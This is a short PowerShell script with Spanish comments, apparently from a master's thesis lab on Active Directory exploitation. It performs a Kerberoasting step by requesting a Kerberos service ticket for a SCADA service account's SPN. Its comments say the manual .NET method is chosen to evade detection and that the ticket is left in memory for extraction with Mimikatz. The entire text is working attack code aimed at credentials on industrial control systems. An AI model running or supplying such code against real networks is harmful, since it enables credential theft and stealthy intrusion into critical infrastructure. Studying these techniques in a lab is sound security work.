# TFM - Fase 3: Active Directory Exploitation
# Descripción: Solicitud manual de TGS (Kerberoasting) usando .NET para evadir detección.
# Objetivo: Cuenta de servicio 'svc_scada'

# 1. Cargar el ensamblado necesario para manipular tokens Kerberos
Add-Type -AssemblyName System.IdentityModel

# 2. Solicitar el Ticket de Servicio (TGS) para el SPN del sistema SCADA
# Esto carga el ticket en la memoria LSASS de la sesión actual
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SCADASvc/hmi.criticosa.corp:3389"

Write-Host "[+] TGS solicitado y cargado en memoria. Listo para extracción con Mimikatz."
